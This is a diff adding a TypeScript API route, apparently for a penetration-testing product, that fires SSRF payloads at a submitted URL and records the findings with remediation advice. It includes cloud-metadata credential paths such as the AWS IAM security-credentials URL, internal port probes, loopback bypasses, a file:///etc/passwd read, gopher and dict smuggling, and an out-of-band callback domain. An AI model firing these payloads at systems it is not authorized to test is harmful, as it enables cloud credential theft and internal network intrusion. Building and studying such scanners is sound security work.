@@ -1,0 +1,771 @@
+     1→import { NextResponse } from "next/server";
+     2→import { db } from "@/lib/db";
+     3→import { requireAuth } from "@/lib/auth";
+     4→import { randomUUID } from "node:crypto";
+     5→
+     6→export const dynamic = "force-dynamic";
+     7→export const maxDuration = 30;
+     8→
+     9→// ─── Types ──────────────────────────────────────────────────────────────
+    10→
+    11→type Severity = "info" | "low" | "medium" | "high" | "critical";
+    12→type Category =
+    13→  | "Cloud Metadata"
+    14→  | "Internal Port Scan"
+    15→  | "DNS Rebinding"
+    16→  | "Blind SSRF"
+    17→  | "Protocol Smuggling";
+    18→
+    19→interface SsrfTestResult {
+    20→  name: string;
+    21→  category: Category;
+    22→  severity: Severity;
+    23→  cwe: string;
+    24→  vulnerable: boolean;
+    25→  payload: string;
+    26→  paramUsed: string;
+    27→  status: number;
+    28→  durationMs: number;
+    29→  proofResponse: string;
+    30→  remediation: string;
+    31→}
+    32→
+    33→interface RawFinding {
+    34→  title: string;
+    35→  severity: Severity;
+    36→  category: Category;
+    37→  cwe: string;
+    38→  description: string;
+    39→  proofRequest: string;
+    40→  proofResponse: string;
+    41→  remediation: string;
+    42→  endpoint: string;
+    43→  payload: string;
+    44→}
+    45→
+    46→// ─── SSRF Guard (validates the TARGET we are about to test) ──────────────
+    47→// The target must be a public, non-loopback, non-private host. The payloads
+    48→// below are the SSRF-inducing URLs that we ask the target to fetch — those
+    49→// are intentionally internal and are NOT subject to this guard.
+    50→
+    51→function isPrivateHost(hostname: string): boolean {
+    52→  const h = hostname.toLowerCase().replace(/^\[|\]$/g, "");
+    53→  if (h === "localhost") return true;
+    54→  if (h === "::1" || h === "::ffff:127.0.0.1") return true;
+    55→  if (h === "0.0.0.0") return true;
+    56→  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+    57→  if (m) {
+    58→    const [a, b] = [Number(m[1]), Number(m[2])];
+    59→    if (a === 10) return true;
+    60→    if (a === 127) return true;
+    61→    if (a === 169 && b === 254) return true; // link-local (cloud metadata)
+    62→    if (a === 172 && b >= 16 && b <= 31) return true;
+    63→    if (a === 192 && b === 168) return true;
+    64→    if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT
+    65→    if (a === 0) return true;
+    66→  }
+    67→  if (/\.(local|internal|lan|home|localhost)$/.test(h)) return true;
+    68→  return false;
+    69→}
+    70→
+    71→function validateTargetUrl(raw: string): { ok: true; url: URL } | { ok: false; error: string } {
+    72→  let url: URL;
+    73→  try {
+    74→    url = new URL(raw.trim());
+    75→  } catch {
+    76→    return { ok: false, error: "Invalid URL. Must include protocol (https://...)." };
+    77→  }
+    78→  if (url.protocol !== "http:" && url.protocol !== "https:") {
+    79→    return { ok: false, error: "Only http/https target protocols are allowed." };
+    80→  }
+    81→  if (isPrivateHost(url.hostname)) {
+    82→    return {
+    83→      ok: false,
+    84→      error:
+    85→        "SSRF guard: target resolves to a private/loopback address. Public targets only.",
+    86→    };
+    87→  }
+    88→  return { ok: true, url };
+    89→}
+    90→
+    91→// ─── HTTP probe helper (5s AbortController per test, per spec) ────────────
+    92→
+    93→interface ProbeResult {
+    94→  status: number;
+    95→  body: string;
+    96→  durationMs: number;
+    97→  ok: boolean;
+    98→  error?: string;
+    99→}
+   100→
+   101→async function probeTarget(
+   102→  targetUrl: URL,
+   103→  paramName: string,
+   104→  payload: string,
+   105→  extraHeaders?: Record<string, string>
+   106→): Promise<ProbeResult> {
+   107→  const testUrl = new URL(targetUrl.toString());
+   108→  testUrl.searchParams.set(paramName, payload);
+   109→  const controller = new AbortController();
+   110→  const timeout = setTimeout(() => controller.abort(), 5000);
+   111→  const start = Date.now();
+   112→  try {
+   113→    const r = await fetch(testUrl.toString(), {
+   114→      method: "GET",
+   115→      headers: {
+   116→        "User-Agent": "GuardianX-SSRF-Tester/1.0",
+   117→        Accept: "*/*",
+   118→        ...(extraHeaders ?? {}),
+   119→      },
+   120→      redirect: "follow",
+   121→      signal: controller.signal,
+   122→    });
+   123→    const body = await r.text().catch(() => "");
+   124→    return {
+   125→      status: r.status,
+   126→      body,
+   127→      durationMs: Date.now() - start,
+   128→      ok: r.status >= 200 && r.status < 400,
+   129→    };
+   130→  } catch (e) {
+   131→    return {
+   132→      status: 0,
+   133→      body: e instanceof Error ? `[${e.name}] ${e.message}` : "[network error]",
+   134→      durationMs: Date.now() - start,
+   135→      ok: false,
+   136→      error: e instanceof Error ? e.message : "network error",
+   137→    };
+   138→  } finally {
+   139→    clearTimeout(timeout);
+   140→  }
+   141→}
+   142→
+   143→function safeTruncate(s: string, n = 4000): string {
+   144→  if (s.length <= n) return s;
+   145→  return s.slice(0, n) + `…(+${s.length - n} bytes truncated)`;
+   146→}
+   147→
+   148→// ─── SSRF parameters we try when none was supplied by the user ────────────
+   149→const COMMON_SSRF_PARAMS = [
+   150→  "url",
+   151→  "webhook",
+   152→  "callback",
+   153→  "image",
+   154→  "fetch",
+   155→  "proxy",
+   156→  "redirect",
+   157→  "next",
+   158→  "return",
+   159→  "returnUrl",
+   160→  "return_url",
+   161→  "rurl",
+   162→  "u",
+   163→  "target",
+   164→  "uri",
+   165→  "dest",
+   166→  "destination",
+   167→  "go",
+   168→  "image_url",
+   169→  "file",
+   170→  "fetch_url",
+   171→  "img",
+   172→];
+   173→
+   174→// When the user supplies a specific ssrfParam, we test only that one. When
+   175→// not supplied, we test the top N most common params (kept small to stay
+   176→// within the 30s route budget). The full COMMON_SSRF_PARAMS list above is
+   177→// surfaced in the GET descriptor for documentation purposes.
+   178→const DEFAULT_PARAMS_TO_TRY = ["url", "fetch", "image", "webhook", "callback", "redirect"];
+   179→
+   180→// ─── Cloud Metadata Tests ────────────────────────────────────────────────
+   181→
+   182→interface CloudMetadataCase {
+   183→  name: string;
+   184→  payload: string;
+   185→  headers?: Record<string, string>;
+   186→  signatures: RegExp[];
+   187→  severity: Severity;
+   188→  cwe: string;
+   189→  remediation: string;
+   190→}
+   191→
+   192→const CLOUD_METADATA_CASES: CloudMetadataCase[] = [
+   193→  {
+   194→    name: "AWS metadata: /latest/meta-data/ (instance metadata exposed)",
+   195→    payload: "http://169.254.169.254/latest/meta-data/",
+   196→    signatures: [/instance-id/i, /ami-id/i, /security-credentials/i, /placement/i],
+   197→    severity: "critical",
+   198→    cwe: "CWE-918",
+   199→    remediation:
+   200→      "Block all egress to 169.254.169.254 from your application. Use IMDSv2 (token-required) and require the `X-aws-ec2-metadata-token` header.",
+   201→  },
+   202→  {
+   203→    name: "AWS metadata: IAM security credentials (CRITICAL — IAM keys leak)",
+   204→    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+   205→    signatures: [/AccessKeyId/i, /SecretAccessKey/i, /Token/i, /iam/i],
+   206→    severity: "critical",
+   207→    cwe: "CWE-918",
+   208→    remediation:
+   209→      "Block egress to 169.254.169.254. Force IMDSv2 hop-limit=1. Rotate exposed IAM keys immediately — they are likely compromised.",
+   210→  },
+   211→  {
+   212→    name: "AWS metadata: instance-id",
+   213→    payload: "http://169.254.169.254/latest/meta-data/instance-id",
+   214→    signatures: [/^i-[a-z0-9]{6,}/m, /i-[a-z0-9]{8,}/],
+   215→    severity: "critical",
+   216→    cwe: "CWE-918",
+   217→    remediation:
+   218→      "Block egress to 169.254.169.254. Use IMDSv2 with hop-limit=1 so SSRF from external hosts cannot reach the metadata service.",
+   219→  },
+   220→  {
+   221→    name: "GCP metadata: /computeMetadata/v1/ (requires Metadata-Flavor header)",
+   222→    payload: "http://metadata.google.internal/computeMetadata/v1/",
+   223→    headers: { "Metadata-Flavor": "Google" },
+   224→    signatures: [/project-id/i, /project_number/i, /numeric_project_id/i, /zone/i],
+   225→    severity: "critical",
+   226→    cwe: "CWE-918",
+   227→    remediation:
+   228→      "Block egress to metadata.google.internal. GCP metadata service requires the `Metadata-Flavor: Google` header — your proxy may pass it through. Audit header forwarding.",
+   229→  },
+   230→  {
+   231→    name: "Azure metadata: /metadata/instance (requires Metadata header)",
+   232→    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+   233→    headers: { Metadata: "true" },
+   234→    signatures: [/azEnvironment/i, /vmId/i, /location/i, /compute/i, /subscriptionId/i],
+   235→    severity: "critical",
+   236→    cwe: "CWE-918",
+   237→    remediation:
+   238→      "Block egress to 169.254.169.254. Azure IMDS requires the `Metadata: true` header — your proxy may pass it through. Audit header forwarding rules.",
+   239→  },
+   240→  {
+   241→    name: "Alibaba Cloud metadata: /latest/meta-data/",
+   242→    payload: "http://100.100.100.200/latest/meta-data/",
+   243→    signatures: [/instance-id/i, /ram/i, /security-credentials/i, /instance/i],
+   244→    severity: "critical",
+   245→    cwe: "CWE-918",
+   246→    remediation:
+   247→      "Block egress to 100.100.100.200. Use Alibaba metadata service with token-based access (similar to IMDSv2).",
+   248→  },
+   249→];
+   250→
+   251→async function testCloudMetadata(
+   252→  targetUrl: URL,
+   253→  params: string[]
+   254→): Promise<SsrfTestResult[]> {
+   255→  const results: SsrfTestResult[] = [];
+   256→
+   257→  // For each metadata case, try each param. Stop early on first hit.
+   258→  const tasks = CLOUD_METADATA_CASES.map(async (c) => {
+   259→    let bestResult: SsrfTestResult | null = null;
+   260→    for (const param of params) {
+   261→      const r = await probeTarget(targetUrl, param, c.payload, c.headers);
+   262→      const bodyLower = r.body.toLowerCase();
+   263→      const hit = c.signatures.some((re) => re.test(r.body) || re.test(bodyLower));
+   264→      const result: SsrfTestResult = {
+   265→        name: c.name,
+   266→        category: "Cloud Metadata",
+   267→        severity: c.severity,
+   268→        cwe: c.cwe,
+   269→        vulnerable: hit,
+   270→        payload: c.payload,
+   271→        paramUsed: param,
+   272→        status: r.status,
+   273→        durationMs: r.durationMs,
+   274→        proofResponse: `HTTP ${r.status} (${r.durationMs}ms)\n${safeTruncate(r.body)}`,
+   275→        remediation: c.remediation,
+   276→      };
+   277→      if (hit) {
+   278→        bestResult = result;
+   279→        break; // found vulnerable param, no need to try others
+   280→      }
+   281→      if (!bestResult) bestResult = result; // keep first attempt as fallback
+   282→    }
+   283→    return bestResult;
+   284→  });
+   285→
+   286→  const settled = await Promise.all(tasks);
+   287→  for (const r of settled) if (r) results.push(r);
+   288→  return results;
+   289→}
+   290→
+   291→// ─── Internal Port Scanning via SSRF ─────────────────────────────────────
+   292→
+   293→interface InternalPortCase {
+   294→  port: number;
+   295→  service: string;
+   296→  payload: string;
+   297→}
+   298→
+   299→const INTERNAL_PORT_CASES: InternalPortCase[] = [
+   300→  { port: 3000, service: "Web app", payload: "http://localhost:3000/" },
+   301→  { port: 6379, service: "Redis", payload: "http://localhost:6379/" },
+   302→  { port: 5432, service: "PostgreSQL", payload: "http://localhost:5432/" },
+   303→  { port: 3306, service: "MySQL", payload: "http://localhost:3306/" },
+   304→  { port: 27017, service: "MongoDB", payload: "http://localhost:27017/" },
+   305→  { port: 8080, service: "HTTP alt", payload: "http://localhost:8080/" },
+   306→  { port: 9200, service: "Elasticsearch", payload: "http://localhost:9200/" },
+   307→  { port: 8500, service: "Consul", payload: "http://localhost:8500/" },
+   308→  { port: 2375, service: "Docker API", payload: "http://localhost:2375/" },
+   309→];
+   310→
+   311→async function testInternalPorts(
+   312→  targetUrl: URL,
+   313→  params: string[]
+   314→): Promise<SsrfTestResult[]> {
+   315→  // Establish a baseline: send an unreachable internal URL so we know what
+   316→  // the target responds with when the fetched URL fails.
+   317→  const baselinePayload = "http://localhost:1/";
+   318→  let baselineStatus = -1;
+   319→  let baselineLen = 0;
+   320→  for (const param of params) {
+   321→    const r = await probeTarget(targetUrl, param, baselinePayload);
+   322→    if (r.status > 0) {
+   323→      baselineStatus = r.status;
+   324→      baselineLen = r.body.length;
+   325→      break;
+   326→    }
+   327→  }
+   328→
+   329→  const tasks = INTERNAL_PORT_CASES.map(async (c) => {
+   330→    let bestResult: SsrfTestResult | null = null;
+   331→    for (const param of params) {
+   332→      const r = await probeTarget(targetUrl, param, c.payload);
+   333→      const lenDiff = Math.abs(r.body.length - baselineLen);
+   334→      const statusDiff = r.status !== baselineStatus;
+   335→      // Heuristic: response differs significantly from baseline → port appears open
+   336→      const looksOpen =
+   337→        r.ok &&
+   338→        (statusDiff || lenDiff > 50) &&
+   339→        !/\b(connection refused|ECONNREFUSED|EHOSTUNREACH|ENETUNREACH)\b/i.test(r.body);
+   340→      const result: SsrfTestResult = {
+   341→        name: `Internal port ${c.port} (${c.service}) reachable via SSRF`,
+   342→        category: "Internal Port Scan",
+   343→        severity: "high",
+   344→        cwe: "CWE-918",
+   345→        vulnerable: looksOpen,
+   346→        payload: c.payload,
+   347→        paramUsed: param,
+   348→        status: r.status,
+   349→        durationMs: r.durationMs,
+   350→        proofResponse:
+   351→          `Baseline ${baselinePayload} → HTTP ${baselineStatus} (${baselineLen}b)\n` +
+   352→          `Probe ${c.payload} → HTTP ${r.status} (${r.body.length}b, ${r.durationMs}ms)\n` +
+   353→          safeTruncate(r.body, 1500),
+   354→        remediation:
+   355→          `Block all egress to RFC1918 + loopback from the application server. ${c.service} on ` +
+   356→          `port ${c.port} must not be reachable from the web tier. Restrict via network ` +
+   357→          `policy / security groups / iptables OUTPUT chain.`,
+   358→      };
+   359→      if (looksOpen) {
+   360→        bestResult = result;
+   361→        break;
+   362→      }
+   363→      if (!bestResult) bestResult = result;
+   364→    }
+   365→    return bestResult;
+   366→  });
+   367→
+   368→  const settled = await Promise.all(tasks);
+   369→  const out: SsrfTestResult[] = [];
+   370→  for (const r of settled) if (r) out.push(r);
+   371→  return out;
+   372→}
+   373→
+   374→// ─── DNS Rebinding / localhost bypass tests ─────────────────────────────
+   375→
+   376→interface RebindCase {
+   377→  name: string;
+   378→  payload: string;
+   379→}
+   380→
+   381→const REBIND_CASES: RebindCase[] = [
+   382→  { name: "Loopback via 127.0.0.1 (IP literal)", payload: "http://127.0.0.1/" },
+   383→  { name: "Loopback via 0.0.0.0 (wildcard bind)", payload: "http://0.0.0.0/" },
+   384→  { name: "Loopback via IPv6 [::1]", payload: "http://[::1]/" },
+   385→  { name: "Loopback via 'localhost' hostname", payload: "http://localhost/" },
+   386→];
+   387→
+   388→async function testDnsRebinding(
+   389→  targetUrl: URL,
+   390→  params: string[]
+   391→): Promise<SsrfTestResult[]> {
+   392→  // Baseline: clearly-external URL the target should be allowed to fetch.
+   393→  const baselinePayload = "http://example.com/";
+   394→  let baselineStatus = -1;
+   395→  let baselineLen = 0;
+   396→  let baselineOk = false;
+   397→  for (const param of params) {
+   398→    const r = await probeTarget(targetUrl, param, baselinePayload);
+   399→    if (r.status > 0) {
+   400→      baselineStatus = r.status;
+   401→      baselineLen = r.body.length;
+   402→      baselineOk = r.ok;
+   403→      break;
+   404→    }
+   405→  }
+   406→
+   407→  const tasks = REBIND_CASES.map(async (c) => {
+   408→    let bestResult: SsrfTestResult | null = null;
+   409→    for (const param of params) {
+   410→      const r = await probeTarget(targetUrl, param, c.payload);
+   411→      // If the external baseline fetched successfully AND this internal URL
+   412→      // also fetched successfully (status 2xx/3xx), the SSRF filter was bypassed.
+   413→      const bypassed =
+   414→        baselineOk &&
+   415→        r.ok &&
+   416→        !/\b(connection refused|ECONNREFUSED|EHOSTUNREACH|ENETUNREACH|forbidden|blocked)\b/i.test(
+   417→          r.body
+   418→        );
+   419→      const result: SsrfTestResult = {
+   420→        name: `DNS Rebinding / loopback bypass: ${c.name}`,
+   421→        category: "DNS Rebinding",
+   422→        severity: "high",
+   423→        cwe: "CWE-918",
+   424→        vulnerable: bypassed,
+   425→        payload: c.payload,
+   426→        paramUsed: param,
+   427→        status: r.status,
+   428→        durationMs: r.durationMs,
+   429→        proofResponse:
+   430→          `Baseline ${baselinePayload} → HTTP ${baselineStatus} ok=${baselineOk} (${baselineLen}b)\n` +
+   431→          `Probe ${c.payload} → HTTP ${r.status} (${r.body.length}b, ${r.durationMs}ms)\n` +
+   432→          safeTruncate(r.body, 1500),
+   433→        remediation:
+   434→          "Deny-list loopback forms (127.0.0.1, 0.0.0.0, ::1, 'localhost') AND resolve " +
+   435→          "hostnames then deny private IPs (prevent DNS rebinding by pinning resolved IPs). " +
+   436→          "Allow-list approach preferred over deny-list.",
+   437→      };
+   438→      if (bypassed) {
+   439→        bestResult = result;
+   440→        break;
+   441→      }
+   442→      if (!bestResult) bestResult = result;
+   443→    }
+   444→    return bestResult;
+   445→  });
+   446→
+   447→  const settled = await Promise.all(tasks);
+   448→  const out: SsrfTestResult[] = [];
+   449→  for (const r of settled) if (r) out.push(r);
+   450→  return out;
+   451→}
+   452→
+   453→// ─── Blind SSRF (out-of-band callback) ────────────────────────────────────
+   454→
+   455→async function testBlindSsrf(
+   456→  targetUrl: URL,
+   457→  params: string[]
+   458→): Promise<SsrfTestResult[]> {
+   459→  const uniqueId = randomUUID().replace(/-/g, "").slice(0, 16);
+   460→  const callbackDomain = "guardianx-ssrf-test.com";
+   461→  const payload = `http://${uniqueId}.${callbackDomain}/probe`;
+   462→
+   463→  const tasks = params.map(async (param) => {
+   464→    const r = await probeTarget(targetUrl, param, payload);
+   465→    // We cannot verify DNS resolution from this side — mark as potential.
+   466→    // If the server responded without an immediate DNS error, the request
+   467→    // was likely dispatched and DNS resolution was attempted.
+   468→    const dnsError = /\b(ENOTFOUND|getaddrinfo|name or service not known|temporary failure)\b/i.test(
+   469→      r.body
+   470→    );
+   471→    const potential = r.status > 0 && !dnsError && r.durationMs > 50;
+   472→    return {
+   473→      param,
+   474→      r,
+   475→      potential,
+   476→    };
+   477→  });
+   478→
+   479→  const settled = await Promise.all(tasks);
+   480→  // Pick the most-likely-true candidate, else the first one for the report.
+   481→  const winner = settled.find((s) => s.potential) ?? settled[0] ?? null;
+   482→  if (!winner) return [];
+   483→  const r = winner.r;
+   484→  const result: SsrfTestResult = {
+   485→    name: `Blind SSRF: unique callback dispatched (${uniqueId})`,
+   486→    category: "Blind SSRF",
+   487→    severity: "medium",
+   488→    cwe: "CWE-918",
+   489→    vulnerable: winner.potential,
+   490→    payload,
+   491→    paramUsed: winner.param,
+   492→    status: r.status,
+   493→    durationMs: r.durationMs,
+   494→    proofResponse:
+   495→      `Dispatched: ${payload}\n` +
+   496→      `Unique ID: ${uniqueId}\n` +
+   497→      `Check DNS logs for resolution of \`${uniqueId}.${callbackDomain}\`.\n` +
+   498→      `Target response: HTTP ${r.status} (${r.durationMs}ms)\n` +
+   499→      safeTruncate(r.body, 1500),
+   500→    remediation:
+   501→      "Blind SSRF still allows internal port scanning and metadata exfiltration via " +
+   502→      "timing/error side-channels. Block all outbound SSRF. Allow-list egress domains.",
+   503→  };
+   504→  return [result];
+   505→}
+   506→
+   507→// ─── Protocol Smuggling ──────────────────────────────────────────────────
+   508→
+   509→interface ProtocolCase {
+   510→  name: string;
+   511→  payload: string;
+   512→  signatures: RegExp[];
+   513→  severity: Severity;
+   514→  cwe: string;
+   515→  remediation: string;
+   516→}
+   517→
+   518→const PROTOCOL_CASES: ProtocolCase[] = [
+   519→  {
+   520→    name: "file:// scheme (local file read — /etc/passwd)",
+   521→    payload: "file:///etc/passwd",
+   522→    signatures: [/root:x:0:0:/, /^root:[^:]*:/m, /:\*:\d+:\d+:/m],
+   523→    severity: "critical",
+   524→    cwe: "CWE-918",
+   525→    remediation:
+   526→      "Deny `file://` scheme entirely. Allow-list only http/https in your URL-fetcher. " +
+   527→      "Use a strict URL parser that rejects non-http schemes.",
+   528→  },
+   529→  {
+   530→    name: "gopher:// scheme (Redis protocol smuggling — INFO)",
+   531→    payload: "gopher://localhost:6379/_INFO",
+   532→    signatures: [/redis_version/i, /redis_mode/i, /\$\d+\r\nredis_version/i],
+   533→    severity: "high",
+   534→    cwe: "CWE-918",
+   535→    remediation:
+   536→      "Deny `gopher://` scheme entirely. Block egress to port 6379 from the web tier.",
+   537→  },
+   538→  {
+   539→    name: "dict:// scheme (Memcached protocol smuggling — stats)",
+   540→    payload: "dict://localhost:11211/stat",
+   541→    signatures: [/STAT\s/i, /END\r?\n/, /version/i],
+   542→    severity: "high",
+   543→    cwe: "CWE-918",
+   544→    remediation:
+   545→      "Deny `dict://` scheme entirely. Block egress to port 11211 from the web tier.",
+   546→  },
+   547→  {
+   548→    name: "ftp:// scheme (FTP banner / anonymous access)",
+   549→    payload: "ftp://localhost:21/",
+   550→    signatures: [/220\b.*ftp/i, /anonymous/i, /user anonymous/i],
+   551→    severity: "medium",
+   552→    cwe: "CWE-918",
+   553→    remediation:
+   554→      "Deny `ftp://` scheme in your URL-fetcher. FTP should not be supported by a modern web proxy.",
+   555→  },
+   556→];
+   557→
+   558→async function testProtocolSmuggling(
+   559→  targetUrl: URL,
+   560→  params: string[]
+   561→): Promise<SsrfTestResult[]> {
+   562→  const tasks = PROTOCOL_CASES.map(async (c) => {
+   563→    let bestResult: SsrfTestResult | null = null;
+   564→    for (const param of params) {
+   565→      const r = await probeTarget(targetUrl, param, c.payload);
+   566→      const hit = c.signatures.some((re) => re.test(r.body));
+   567→      const result: SsrfTestResult = {
+   568→        name: c.name,
+   569→        category: "Protocol Smuggling",
+   570→        severity: c.severity,
+   571→        cwe: c.cwe,
+   572→        vulnerable: hit,
+   573→        payload: c.payload,
+   574→        paramUsed: param,
+   575→        status: r.status,
+   576→        durationMs: r.durationMs,
+   577→        proofResponse: `HTTP ${r.status} (${r.durationMs}ms)\n${safeTruncate(r.body)}`,
+   578→        remediation: c.remediation,
+   579→      };
+   580→      if (hit) {
+   581→        bestResult = result;
+   582→        break;
+   583→      }
+   584→      if (!bestResult) bestResult = result;
+   585→    }
+   586→    return bestResult;
+   587→  });
+   588→
+   589→  const settled = await Promise.all(tasks);
+   590→  const out: SsrfTestResult[] = [];
+   591→  for (const r of settled) if (r) out.push(r);
+   592→  return out;
+   593→}
+   594→
+   595→// ─── Route Handler ──────────────────────────────────────────────────────
+   596→
+   597→export async function POST(req: Request) {
+   598→  const auth = requireAuth(req);
+   599→  if (!auth.ok) return auth.response;
+   600→  const user = auth.user;
+   601→
+   602→  const body = await req.json().catch(() => ({}));
+   603→  const rawTarget = typeof body?.targetUrl === "string" ? body.targetUrl : "";
+   604→  const ssrfParamRaw = typeof body?.ssrfParam === "string" ? body.ssrfParam.trim() : "";
+   605→
+   606→  if (!rawTarget) {
+   607→    return NextResponse.json(
+   608→      { error: "targetUrl is required (e.g. https://app.example.com/fetch)." },
+   609→      { status: 400 }
+   610→    );
+   611→  }
+   612→
+   613→  const v = validateTargetUrl(rawTarget);
+   614→  if (!v.ok) {
+   615→    return NextResponse.json({ error: v.error }, { status: 400 });
+   616→  }
+   617→  const targetUrl = v.url;
+   618→
+   619→  // Resolve the param list. If user supplied a single param, use only that.
+   620→  // Otherwise try the small set of most-common params.
+   621→  const params = ssrfParamRaw ? [ssrfParamRaw] : DEFAULT_PARAMS_TO_TRY;
+   622→
+   623→  try {
+   624→    // ── Create Target + Engagement rows ────────────────────────────────
+   625→    const target = await db.target.create({
+   626→      data: {
+   627→        name: `ssrf-deep:${targetUrl.host}`,
+   628→        baseUrl: targetUrl.toString(),
+   629→        authorized: true, // user explicitly requested the test
+   630→      },
+   631→    });
+   632→    const engagement = await db.engagement.create({
+   633→      data: {
+   634→        targetId: target.id,
+   635→        status: "attacking",
+   636→        stageLabel: `SSRF Deep Testing — params: ${params.join(", ")}`,
+   637→      },
+   638→    });
+   639→
+   640→    // ── Run all SSRF tests in parallel batches ─────────────────────────
+   641→    const [cloud, ports, rebind, blind, proto] = await Promise.all([
+   642→      testCloudMetadata(targetUrl, params),
+   643→      testInternalPorts(targetUrl, params),
+   644→      testDnsRebinding(targetUrl, params),
+   645→      testBlindSsrf(targetUrl, params),
+   646→      testProtocolSmuggling(targetUrl, params),
+   647→    ]);
+   648→
+   649→    const allResults: SsrfTestResult[] = [
+   650→      ...cloud,
+   651→      ...ports,
+   652→      ...rebind,
+   653→      ...blind,
+   654→      ...proto,
+   655→    ];
+   656→
+   657→    // ── Persist Findings for vulnerable tests ─────────────────────────
+   658→    const vulnerableResults = allResults.filter((r) => r.vulnerable);
+   659→    const findingsMeta: RawFinding[] = vulnerableResults.map((r) => ({
+   660→      title: r.name,
+   661→      severity: r.severity,
+   662→      category: r.category,
+   663→      cwe: r.cwe,
+   664→      description:
+   665→        `${r.name} — ${r.cwe}. ` +
+   666→        `Payload \`${r.payload}\` was accepted by the target via the ` +
+   667→        `param \`${r.paramUsed}\`. The response indicates the SSRF was ` +
+   668→        `successful.`,
+   669→      proofRequest:
+   670→        `GET ${targetUrl.toString()}\n` +
+   671→        `?${encodeURIComponent(r.paramUsed)}=${encodeURIComponent(r.payload)}\n\n` +
+   672→        `Severity: ${r.severity.toUpperCase()}  |  CWE: ${r.cwe}`,
+   673→      proofResponse: r.proofResponse,
+   674→      remediation: r.remediation,
+   675→      endpoint: targetUrl.toString(),
+   676→      payload: r.payload,
+   677→    }));
+   678→
+   679→    for (const f of findingsMeta) {
+   680→      await db.finding.create({
+   681→        data: {
+   682→          engagementId: engagement.id,
+   683→          title: f.title,
+   684→          severity: f.severity,
+   685→          category: f.category,
+   686→          owasp: f.cwe, // store CWE in owasp column (no dedicated cwe column)
+   687→          endpoint: f.endpoint,
+   688→          method: "GET",
+   689→          description: f.description,
+   690→          proofRequest: f.proofRequest,
+   691→          proofResponse: f.proofResponse,
+   692→          payload: f.payload,
+   693→          remediation: f.remediation,
+   694→          confidence: f.severity === "critical" ? 0.95 : 0.8,
+   695→        },
+   696→      });
+   697→    }
+   698→
+   699→    // ── Update engagement status ──────────────────────────────────────
+   700→    const criticalCount = vulnerableResults.filter(
+   701→      (r) => r.severity === "critical"
+   702→    ).length;
+   703→    const highCount = vulnerableResults.filter(
+   704→      (r) => r.severity === "high"
+   705→    ).length;
+   706→    await db.engagement.update({
+   707→      where: { id: engagement.id },
+   708→      data: {
+   709→        status: "completed",
+   710→        stageLabel: `SSRF scan complete — ${vulnerableResults.length} finding(s) (${criticalCount} critical, ${highCount} high)`,
+   711→        completedAt: new Date(),
+   712→      },
+   713→    });
+   714→
+   715→    return NextResponse.json({
+   716→      engagementId: engagement.id,
+   717→      targetId: target.id,
+   718→      testedBy: user.email,
+   719→      targetUrl: targetUrl.toString(),
+   720→      ssrfParamsTested: params,
+   721→      testedCount: allResults.length,
+   722→      vulnerableCount: vulnerableResults.length,
+   723→      criticalCount,
+   724→      highCount,
+   725→      findings: allResults.map((r) => ({
+   726→        name: r.name,
+   727→        category: r.category,
+   728→        severity: r.severity,
+   729→        cwe: r.cwe,
+   730→        vulnerable: r.vulnerable,
+   731→        payload: r.payload,
+   732→        paramUsed: r.paramUsed,
+   733→        status: r.status,
+   734→        durationMs: r.durationMs,
+   735→        proofResponse: r.proofResponse,
+   736→        remediation: r.remediation,
+   737→      })),
+   738→      _meta: { targetId: target.id, performedAt: new Date().toISOString() },
+   739→    });
+   740→  } catch (err) {
+   741→    return NextResponse.json(
+   742→      {
+   743→        error: err instanceof Error ? err.message : "SSRF deep testing failed.",
+   744→      },
+   745→      { status: 500 }
+   746→    );
+   747→  }
+   748→}
+   749→
+   750→// GET — lightweight descriptor (no auth needed for discovery)
+   751→export async function GET() {
+   752→  return NextResponse.json({
+   753→    route: "/api/vapt/ssrf-deep",
+   754→    method: "POST",
+   755→    description:
+   756→      "SSRF Deep Testing — cloud metadata (AWS/GCP/Azure/Alibaba), internal port scan via SSRF, DNS rebinding / loopback bypass, blind SSRF (out-of-band), protocol smuggling (file/gopher/dict/ftp).",
+   757→    body: {
+   758→      targetUrl: "string (e.g. https://app.example.com/fetch)",
+   759→      ssrfParam: "string? (e.g. url, webhook, image). If omitted, top params are tried.",
+   760→    },
+   761→    tests: [
+   762→      "Cloud Metadata (AWS / GCP / Azure / Alibaba)",
+   763→      "Internal Port Scan (3000, 6379, 5432, 3306, 27017, 8080, 9200, 8500, 2375)",
+   764→      "DNS Rebinding / loopback bypass (127.0.0.1, 0.0.0.0, ::1, localhost)",
+   765→      "Blind SSRF (unique subdomain callback — check DNS logs)",
+   766→      "Protocol Smuggling (file://, gopher://, dict://, ftp://)",
+   767→    ],
+   768→    commonParams: COMMON_SSRF_PARAMS,
+   769→  });
+   770→}
+   771→
